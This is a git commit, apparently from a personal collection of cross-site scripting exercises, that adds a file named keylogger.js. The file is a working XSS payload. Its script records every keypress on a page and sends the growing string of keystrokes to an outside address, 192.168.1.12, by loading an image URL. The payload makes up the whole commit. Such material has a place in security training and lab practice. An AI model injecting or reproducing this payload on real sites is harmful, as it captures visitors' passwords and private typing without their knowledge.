42bf02c1ba1492dbfdf8fa95dbcd4f717c4c20f8
Mohamed El Abbass <mohamedelabbass21@gmail.com>
2026-02-02 17:11:42 +0100

    update xss

---
+++ 02 - Cross-Site Scripting (XSS)/keylogger.js
@@ -0,0 +1,12 @@
+<script>
+
+  var k = "";
+  document.onkeypress = function(e){
+    e = e || window.event;
+    k += e.key;
+    var i = new Image();
+    i.src = "http://192.168.1.12/" + k
+  };
+
+</script>
+
